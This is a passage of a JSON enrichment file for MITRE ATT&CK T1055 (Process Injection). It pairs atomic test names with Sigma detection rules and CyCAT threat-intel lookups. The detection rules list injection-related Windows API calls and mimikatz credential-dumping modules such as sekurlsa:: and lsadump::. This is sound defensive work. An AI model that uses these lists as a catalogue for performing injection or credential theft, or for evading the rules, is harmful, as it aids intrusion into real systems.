@@ -1,0 +1,863 @@
+{
+    "id": "T1055",
+    "name": "Process Injection",
+    "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Defense Evasion, Privilege Escalation",
+    "data_sources": "Process: Process Modification, Module: Module Load, Process: OS API Execution, Process: Process Access, File: File Modification, File: File Metadata",
+    "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as `CreateRemoteThread`, `SuspendThread`/`SetThreadContext`/`ResumeThread`, `QueueUserAPC`/`NtQueueApcThread`, and those that can be used to modify memory within another process, such as `VirtualAllocEx`/`WriteProcessMemory`, may be used for this technique.(Citation: Elastic Process Injection July 2017)\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017)\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.",
+    "url": "https://attack.mitre.org/techniques/T1055",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1055",
+                "atomic_attack_guid": "2a3c7035-d14f-467a-af94-933e49fe6786",
+                "atomic_attack_name": "Process Injection with Go using CreateThread WinAPI (Natively)",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential WinAPI Calls Via CommandLine",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_inline_win_api_access.yml",
+                        "remote_content": "title: Potential WinAPI Calls Via CommandLine\nid: ba3f5c1b-6272-4119-9dbd-0bc8d21c2702\nrelated:\n    - id: 03d83090-8cba-44a0-b02f-0b756a050306\n      type: derived\nstatus: test\ndescription: Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\nreferences:\n    - https://twitter.com/m417z/status/1566674631788007425\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-06\nmodified: 2023-01-09\ntags:\n    - attack.execution\n    - attack.t1106\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'AddSecurityPackage'\n            - 'AdjustTokenPrivileges'\n            - 'Advapi32'\n            - 'CloseHandle'\n            - 'CreateProcessWithToken'\n            - 'CreatePseudoConsole'\n            - 'CreateRemoteThread'\n            - 'CreateThread'\n            - 'CreateUserThread'\n            - 'DangerousGetHandle'\n            - 'DuplicateTokenEx'\n            - 'EnumerateSecurityPackages'\n            - 'FreeHGlobal'\n            - 'FreeLibrary'\n            - 'GetDelegateForFunctionPointer'\n            - 'GetLogonSessionData'\n            - 'GetModuleHandle'\n            - 'GetProcAddress'\n            - 'GetProcessHandle'\n            - 'GetTokenInformation'\n            - 'ImpersonateLoggedOnUser'\n            - 'kernel32'\n            - 'LoadLibrary'\n            - 'memcpy'\n            - 'MiniDumpWriteDump'\n            # - 'msvcrt'\n            - 'ntdll'\n            - 'OpenDesktop'\n            - 'OpenProcess'\n            - 'OpenProcessToken'\n            - 'OpenThreadToken'\n            - 'OpenWindowStation'\n            - 'PtrToString'\n            - 'QueueUserApc'\n            - 'ReadProcessMemory'\n            - 'RevertToSelf'\n            - 'RtlCreateUserThread'\n            - 'secur32'\n            - 'SetThreadToken'\n            # - 'user32'\n            - 'VirtualAlloc'\n            - 'VirtualFree'\n            - 'VirtualProtect'\n            - 'WaitForSingleObject'\n            - 'WriteInt32'\n            - 'WriteProcessMemory'\n            - 'ZeroFreeGlobalAllocUnicode'\n    filter_optional_mpcmdrun:\n        Image|endswith: '\\MpCmdRun.exe'\n        CommandLine|contains: 'GetLoadLibraryWAddress32'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1055",
+                "atomic_attack_guid": "2871ed59-3837-4a52-9107-99500ebc87cb",
+                "atomic_attack_name": "Process Injection with Go using CreateThread WinAPI",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential WinAPI Calls Via CommandLine",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_inline_win_api_access.yml",
+                        "remote_content": "title: Potential WinAPI Calls Via CommandLine\nid: ba3f5c1b-6272-4119-9dbd-0bc8d21c2702\nrelated:\n    - id: 03d83090-8cba-44a0-b02f-0b756a050306\n      type: derived\nstatus: test\ndescription: Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\nreferences:\n    - https://twitter.com/m417z/status/1566674631788007425\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-06\nmodified: 2023-01-09\ntags:\n    - attack.execution\n    - attack.t1106\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'AddSecurityPackage'\n            - 'AdjustTokenPrivileges'\n            - 'Advapi32'\n            - 'CloseHandle'\n            - 'CreateProcessWithToken'\n            - 'CreatePseudoConsole'\n            - 'CreateRemoteThread'\n            - 'CreateThread'\n            - 'CreateUserThread'\n            - 'DangerousGetHandle'\n            - 'DuplicateTokenEx'\n            - 'EnumerateSecurityPackages'\n            - 'FreeHGlobal'\n            - 'FreeLibrary'\n            - 'GetDelegateForFunctionPointer'\n            - 'GetLogonSessionData'\n            - 'GetModuleHandle'\n            - 'GetProcAddress'\n            - 'GetProcessHandle'\n            - 'GetTokenInformation'\n            - 'ImpersonateLoggedOnUser'\n            - 'kernel32'\n            - 'LoadLibrary'\n            - 'memcpy'\n            - 'MiniDumpWriteDump'\n            # - 'msvcrt'\n            - 'ntdll'\n            - 'OpenDesktop'\n            - 'OpenProcess'\n            - 'OpenProcessToken'\n            - 'OpenThreadToken'\n            - 'OpenWindowStation'\n            - 'PtrToString'\n            - 'QueueUserApc'\n            - 'ReadProcessMemory'\n            - 'RevertToSelf'\n            - 'RtlCreateUserThread'\n            - 'secur32'\n            - 'SetThreadToken'\n            # - 'user32'\n            - 'VirtualAlloc'\n            - 'VirtualFree'\n            - 'VirtualProtect'\n            - 'WaitForSingleObject'\n            - 'WriteInt32'\n            - 'WriteProcessMemory'\n            - 'ZeroFreeGlobalAllocUnicode'\n    filter_optional_mpcmdrun:\n        Image|endswith: '\\MpCmdRun.exe'\n        CommandLine|contains: 'GetLoadLibraryWAddress32'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1055",
+                "atomic_attack_guid": "3203ad24-168e-4bec-be36-f79b13ef8a83",
+                "atomic_attack_name": "Remote Process Injection in LSASS via mimikatz",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "HackTool - Mimikatz Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
+                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Potential Execution of Sysinternals Tools",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml",
+                        "remote_content": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "6fe1719e-ecdf-4caf-bffe-4f501cb0a561",
+                    "0319b483-5973-4932-91ea-5a44c2975b24",
+                    "0fa66f66-e3f6-4a9c-93f8-4f2610b00171",
+                    "5c125ad1-a1a8-495e-ae07-48bd950d210f",
+                    "43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
+                    "4508a70e-97ef-4300-b62b-ff27992990ea",
+                    "5d9b5933-964c-433c-b84f-4c680a2fe004",
+                    "052ec6f6-1adc-41e6-907a-f1c813478bee",
+                    "250ae82f-736e-4844-a68b-0b5e8cc887da",
+                    "5e78dc2c-afc8-411f-94a5-40bb950d210f",
+                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                    "e7888eb1-13b0-4616-bd99-4bc0c2b054b9",
+                    "9f2cc74d-78af-4eb2-bb64-9cd1d292b87b",
+                    "6309645e-122d-4c5b-bb2b-22e4f9c2fa42",
+                    "fe3ac066-98bb-432a-b1e7-a5229cb39d4a",
+                    "e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e",
+                    "85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7",
+                    "e81528db-fc02-45e8-8e98-4e84aba1f10b",
+                    "1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd",
+                    "637f689e-b4a5-4a86-be0e-0100a0a33ba2",
+                    "b7967e22-3d7e-409b-9ed5-cdae3f9243a1",
+                    "abfb5a93-e695-4ee9-bc10-541290bcd663",
+                    "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
+                    "5c6baef6-fca0-446e-b0b1-ac45950d210f",
+                    "16c37b52-b141-42a5-a3ea-bbe098444397",
+                    "b655a06a-31c0-477a-95c2-3726b83d649d",
+                    "33a2d1dd-f3b0-40bd-8baf-7974468927cc",
+                    "3c1b5fb0-c72f-45ba-abd1-4d4c353144ab",
+                    "5dbae98e-7974-4480-86db-44be950d210f",
+                    "6345b048-8441-43a7-9bed-541133633d7a",
+                    "16b37b70-6fcf-4814-a092-c36bd3aafcbd",
+                    "744a188b-0415-4792-896f-11ddb0588dbc",
+                    "5f113a8f-8b61-41ca-b90f-d374fa7e4a39",
+                    "54dd4ef7-f7b2-418e-a191-5def4fbb0033",
+                    "66d31e5f-52d6-40a4-9615-002d3789a119",
+                    "d5601f8c-b26f-4ab0-9035-69e11a8d4ad2",
+                    "409f8a98-4496-4aaa-818a-c931c0a8b832",
+                    "d1aa3382-abab-446f-96ea-4de52908210b",
+                    "758d96ed-9dd4-4009-9270-65f2c3dd30cc",
+                    "5ced8da1-0960-40bc-b5dc-2fed0a016219",
+                    "5dee2bc3-47ac-4784-a52a-4da2950d210f",
+                    "0e7163d4-9e19-4fa7-9be6-000c61aad77a",
+                    "d78b5d61-187d-44b6-bf02-93486a80de5a"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "6fe1719e-ecdf-4caf-bffe-4f501cb0a561",
+                        "lookup_data": {
+                            "description": "Detects the suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675 .",
+                            "raw": "author: Sittikorn S, Nuttakorn T, Tim Shelton\ndate: 2021/07/01\ndescription: Detects the suspicious file that is created from PoC code against Windows\n  Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare),\n  CVE-2021-1675 .\ndetection:\n  condition: selection and not keywords\n  keywords:\n  - File submitted to Symantec\n  selection:\n    Filename|contains: C:\\Windows\\System32\\spool\\drivers\\x64\\\nfalsepositives:\n- Unlikely, or pending PSP analysis\nfields:\n- Signature\n- Filename\n- ComputerName\nid: 6fe1719e-ecdf-4caf-bffe-4f501cb0a561\nlevel: critical\nlogsource:\n  category: antivirus\nmodified: 2022/03/22\nreferences:\n- https://twitter.com/mvelazco/status/1410291741241102338\n- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675\n- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527\nstatus: stable\ntags:\n- attack.privilege_escalation\n- attack.t1055\ntitle: Antivirus PrinterNightmare CVE-2021-34527 Exploit Detection\n",
+                            "sigma:id": "6fe1719e-ecdf-4caf-bffe-4f501cb0a561",
+                            "title": "Antivirus PrinterNightmare CVE-2021-34527 Exploit Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
+                        "lookup_data": {
+                            "description": "Conti Ransomware",
+                            "link": "http://www.botvrij.eu/data/feed-osint/0319b483-5973-4932-91ea-5a44c2975b24.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1621181463",
+                            "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0fa66f66-e3f6-4a9c-93f8-4f2610b00171",
+                        "lookup_data": {
+                            "description": "Detect usage of DLL \"coregen.exe\" (Microsoft CoreCLR Native Image Generator) binary to sideload arbitrary DLLs.",
+                            "raw": "author: frack113\ndate: 2022/12/31\ndescription: Detect usage of DLL \"coregen.exe\" (Microsoft CoreCLR Native Image Generator)\n  binary to sideload arbitrary DLLs.\ndetection:\n  condition: selection and not filter\n  filter:\n    ImageLoaded|startswith:\n    - C:\\Windows\\System32\\\n    - C:\\Windows\\SysWOW64\\\n    - C:\\Program Files\\Microsoft Silverlight\\\n    - C:\\Program Files (x86)\\Microsoft Silverlight\\\n  selection:\n    Image|endswith: \\coregen.exe\nfalsepositives:\n- Unknown\nid: 0fa66f66-e3f6-4a9c-93f8-4f2610b00171\nlevel: medium\nlogsource:\n  category: image_load\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Coregen/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.t1055\ntitle: Potential DLL Sideloading Using Coregen.exe\n",
+                            "sigma:id": "0fa66f66-e3f6-4a9c-93f8-4f2610b00171",
+                            "title": "Potential DLL Sideloading Using Coregen.exe",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5c125ad1-a1a8-495e-ae07-48bd950d210f",
+                        "lookup_data": {
+                            "description": "OSINT - â€˜Operation Sharpshooterâ€™ Targets Global Defense, Critical Infrastructure",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5c125ad1-a1a8-495e-ae07-48bd950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1544734085",
+                            "uuid": "5c125ad1-a1a8-495e-ae07-48bd950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
+                        "lookup_data": {
+                            "capec": "CAPEC-640",
+                            "mitre-attack-id": "T1055",
+                            "mitre-cti:description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
+                            "mitre-cti:name": "Process Injection",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'modified': '2022-10-18T20:58:50.105Z', 'name': 'Process Injection', 'description': \"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \\n\\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \\n\\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. \", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}], 'x_mitre_detection': 'Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) \\n\\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \\n\\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \\n\\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ', 'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_is_subtechnique': False, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.3', 'x_mitre_contributors': ['Anastasios Pingios', 'Christiaan Beek, @ChristiaanBeek', 'Ryan Becwar'], 'x_mitre_data_sources': ['Process: Process Modification', 'File: File Metadata', 'File: File Modification', 'Process: Process Metadata', 'Process: OS API Execution', 'Process: Process Access', 'Module: Module Load'], 'x_mitre_defense_bypassed': ['Application control', 'Anti-virus'], 'type': 'attack-pattern', 'id': 'attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d', 'created': '2017-05-31T21:30:47.843Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1055', 'external_id': 'T1055'}, {'source_name': 'GNU Acct', 'description': 'GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.', 'url': 'https://www.gnu.org/software/acct/'}, {'source_name': 'Elastic Process Injection July 2017', 'description': 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.', 'url': 'https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process'}, {'source_name': 'RHEL auditd', 'description': 'Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.', 'url': 'https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing'}, {'source_name': 'ArtOfMemoryForensics', 'description': 'Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.'}, {'source_name': 'Microsoft Sysmon v6 May 2017', 'description': 'Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.', 'url': 'https://docs.microsoft.com/sysinternals/downloads/sysmon'}, {'source_name': 'Chokepoint preload rootkits', 'description': 'stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.', 'url': 'http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html'}, {'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/640.html', 'external_id': 'CAPEC-640'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4508a70e-97ef-4300-b62b-ff27992990ea",
+                        "lookup_data": {
+                            "description": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript",
+                            "raw": "author: omkar72, oscd.community\ndate: 2020/10/14\ndescription: Detects .NET CLR DLLs being loaded by scripting applications such as\n  wscript or cscript\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|endswith:\n    - \\clr.dll\n    - \\mscoree.dll\n    - \\mscorlib.dll\n    Image|endswith:\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\mshta.exe\n    - \\cmstp.exe\n    - \\msxsl.exe\nfalsepositives:\n- Unknown\nid: 4508a70e-97ef-4300-b62b-ff27992990ea\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2023/01/06\nreferences:\n- https://github.com/tyranid/DotNetToJScript\n- https://thewover.github.io/Introducing-Donut/\n- https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html\n- https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008\nstatus: test\ntags:\n- attack.execution\n- attack.privilege_escalation\n- attack.t1055\ntitle: CLR DLL Loaded Via Scripting Applications\n",
+                            "sigma:id": "4508a70e-97ef-4300-b62b-ff27992990ea",
+                            "title": "CLR DLL Loaded Via Scripting Applications",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5d9b5933-964c-433c-b84f-4c680a2fe004",
+                        "lookup_data": {
+                            "description": "Emotet in Depth TTP 10-07-19",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d9b5933-964c-433c-b84f-4c680a2fe004.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1621850615",
+                            "uuid": "5d9b5933-964c-433c-b84f-4c680a2fe004",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "052ec6f6-1adc-41e6-907a-f1c813478bee",
+                        "lookup_data": {
+                            "description": "Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process",
+                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/08/11\ndescription: Detects potential use of CreateRemoteThread api and LoadLibrary function\n  to inject DLL into a process\ndetection:\n  condition: selection\n  selection:\n    StartFunction: LoadLibraryA\n    StartModule|endswith: \\kernel32.dll\nfalsepositives:\n- Unknown\nid: 052ec6f6-1adc-41e6-907a-f1c813478bee\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-180719170510.html\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1055.001\ntitle: CreateRemoteThread API and LoadLibrary\n",
+                            "sigma:id": "052ec6f6-1adc-41e6-907a-f1c813478bee",
+                            "title": "CreateRemoteThread API and LoadLibrary",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "250ae82f-736e-4844-a68b-0b5e8cc887da",
+                        "lookup_data": {
+                            "description": "Detects potential shellcode injection used by tools such as Metasploit's migrate and Empire's psinject",
+                            "raw": "author: Bhabesh Raj\ndate: 2022/03/11\ndescription: Detects potential shellcode injection used by tools such as Metasploit's\n  migrate and Empire's psinject\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_ddvdatacollector:\n    SourceImage|endswith: \\MSBuild\\Current\\Bin\\MSBuild.exe\n    SourceImage|startswith: C:\\Program Files\\Microsoft Visual Studio\\\n    TargetImage: C:\\Program Files\\Dell\\DellDataVault\\DDVDataCollector.exe\n  filter_dell_folders:\n    CallTrace|startswith: C:\\Windows\\System32\\ntdll.dll\n    GrantedAccess: '0x1F3FFF'\n    SourceImage|startswith:\n    - C:\\Program Files\\Dell\\\n    - C:\\Program Files (x86)\\Dell\\\n    TargetImage|startswith:\n    - C:\\Program Files\\Dell\\\n    - C:\\Program Files (x86)\\Dell\\\n  filter_dell_specifc:\n    CallTrace|startswith: C:\\Windows\\System32\\ntdll.dll\n    GrantedAccess: '0x1F3FFF'\n    SourceImage: C:\\Program Files (x86)\\Dell\\UpdateService\\ServiceShell.exe\n    TargetImage: C:\\Windows\\Explorer.EXE\n  filter_visual_studio:\n    CallTrace|startswith: C:\\Windows\\System32\\ntdll.dll\n    SourceImage:\n    - C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\PerfWatson2.exe\n    - C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\PerfWatson2.exe\n    TargetImage:\n    - C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\devenv.exe\n    - C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\devenv.exe\n  filter_wmiprvese:\n    CallTrace|contains: \\System.ni.dll+\n    CallTrace|startswith: C:\\Windows\\SYSTEM32\\ntdll.dll\n    SourceImage: C:\\Windows\\System32\\Wbem\\Wmiprvse.exe\n    TargetImage: C:\\Windows\\system32\\lsass.exe\n  selection:\n    CallTrace|contains: UNKNOWN\n    GrantedAccess:\n    - '0x147a'\n    - '0x1f3fff'\nfalsepositives:\n- Unknown\nid: 250ae82f-736e-4844-a68b-0b5e8cc887da\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/12/20\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1055\ntitle: Potential Shellcode Injection\n",
+                            "sigma:id": "250ae82f-736e-4844-a68b-0b5e8cc887da",
+                            "title": "Potential Shellcode Injection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
+                        "lookup_data": {
+                            "description": "Trickbot to Ryuk in Two Hours",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e78dc2c-afc8-411f-94a5-40bb950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1585237597",
+                            "uuid": "5e78dc2c-afc8-411f-94a5-40bb950d210f",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                        "lookup_data": {
+                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1663580963",
+                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e7888eb1-13b0-4616-bd99-4bc0c2b054b9",
+                        "lookup_data": {
+                            "description": "Detects a \"dllhost\" spawning with no commandline arguments which is a very rare thing to happen and could indicate process injection activity or malware mimicking similar system processes",
